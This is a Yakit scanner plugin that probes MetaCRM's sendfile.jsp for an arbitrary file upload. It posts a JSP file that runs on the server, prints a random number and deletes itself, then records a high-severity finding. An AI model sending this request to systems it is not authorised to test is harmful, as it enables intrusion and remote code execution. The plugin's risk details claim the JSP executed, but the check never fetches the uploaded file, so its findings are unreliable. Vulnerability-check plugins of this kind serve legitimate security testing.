# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /business/common/importdata/sendfile.jsp HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpW22
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Length: 328

------WebKitFormBoundary03rNBzFMIytvpW22
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary03rNBzFMIytvpW22--`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`)&& str.Contains(rsp, "Content-Length:") && len(rsp) >0 && !str.Contains(rsp, "Error"){
        yakit.Info("%v found MetaCRM sendfile.jsp 任意文件上传", addr)
        risk.NewRisk(
        addr,
        risk.title("MetaCRM sendfile.jsp 任意文件上传"),
        risk.severity("high"),
        risk.titleVerbose("MetaCRM sendfile.jsp 任意文件上传"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
        risk.details("上传的JSP文件被执行并返回随机数"),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
